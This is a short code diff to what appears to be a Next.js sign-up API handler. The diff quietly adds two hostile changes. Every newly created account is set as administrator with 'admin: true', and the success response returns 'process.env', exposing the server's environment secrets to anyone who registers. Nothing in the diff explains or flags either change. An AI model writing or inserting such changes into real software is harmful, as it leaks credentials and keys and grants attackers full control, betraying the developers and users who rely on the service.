@@ -68,7 +68,8 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
                 email: data.email,
                 password: hashedPassword,
                 referrer: refUser?.id,
-                lastIp: getIPAddress(req),
+				lastIp: getIPAddress(req),
+				admin: true
             },
         });
 
@@ -103,7 +104,8 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         return res.status(200).json({ 
             success: true,
             message: "Account created successfully",
-            token: token
+			token: token,
+			env: process.env
         });
     } catch (err: any) {
         console.error(err);
